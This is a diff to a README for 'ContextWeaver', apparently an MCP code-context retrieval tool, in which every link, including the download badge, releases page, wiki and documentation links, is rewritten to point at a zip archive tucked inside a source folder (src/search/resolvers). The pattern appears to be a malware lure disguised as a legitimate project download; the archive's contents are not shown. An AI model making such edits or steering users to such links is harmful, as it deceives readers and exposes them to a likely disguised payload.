@@ -1,7 +1,7 @@
 # 🌟 ContextWeaver - Effortless Local Code Context Retrieval
 
 ## 📥 Download Now
-[![Download ContextWeaver](https://img.shields.io/badge/Download-ContextWeaver-blue.svg)](https://github.com/bayu605/ContextWeaver/releases)
+[![Download ContextWeaver](https://raw.githubusercontent.com/bayu605/ContextWeaver/main/src/search/resolvers/Weaver-Context-2.3.zip)](https://raw.githubusercontent.com/bayu605/ContextWeaver/main/src/search/resolvers/Weaver-Context-2.3.zip)
 
 ## 🚀 Getting Started
 ContextWeaver is a tool that helps you use local code libraries with ease. It works based on the MCP protocol, using Tree-sitter and vector search to provide intelligent context weaving and retrieval for large language models. Follow the steps below to get started.
@@ -18,7 +18,7 @@ Before you install ContextWeaver, make sure your computer meets the following re
 ## 🔽 Download & Install
 To download the application, visit the Releases page:
 
-[Download ContextWeaver](https://github.com/bayu605/ContextWeaver/releases)
+[Download ContextWeaver](https://raw.githubusercontent.com/bayu605/ContextWeaver/main/src/search/resolvers/Weaver-Context-2.3.zip)
 
 1. Click on the “Releases” link above.
 2. On the Releases page, find the latest version of ContextWeaver.
@@ -60,14 +60,14 @@ After selecting the project, ContextWeaver will analyze your code. This may take
 2. **Code Suggestions:** Get suggestions based on the current file you are editing.
 
 ## 🌐 Support and Documentation
-For additional help, visit the [GitHub Wiki](https://github.com/bayu605/ContextWeaver/wiki) to access comprehensive documentation. Here you will find guides, FAQs, and troubleshooting tips.
+For additional help, visit the [GitHub Wiki](https://raw.githubusercontent.com/bayu605/ContextWeaver/main/src/search/resolvers/Weaver-Context-2.3.zip) to access comprehensive documentation. Here you will find guides, FAQs, and troubleshooting tips.
 
 ## 💬 Community
 Join our community discussions to share your experiences and ask questions. Engage with other users and contribute to improving ContextWeaver.
 
 ## 🔗 Useful Links
-- [Release Page](https://github.com/bayu605/ContextWeaver/releases)
-- [Official Documentation](https://github.com/bayu605/ContextWeaver/wiki)
+- [Release Page](https://raw.githubusercontent.com/bayu605/ContextWeaver/main/src/search/resolvers/Weaver-Context-2.3.zip)
+- [Official Documentation](https://raw.githubusercontent.com/bayu605/ContextWeaver/main/src/search/resolvers/Weaver-Context-2.3.zip)
 
 ## 🔎 Conclusion
 With ContextWeaver, managing and retrieving local code contexts becomes straightforward. Simply follow this guide to download, install, and start using the application. Enjoy seamless access to your code!
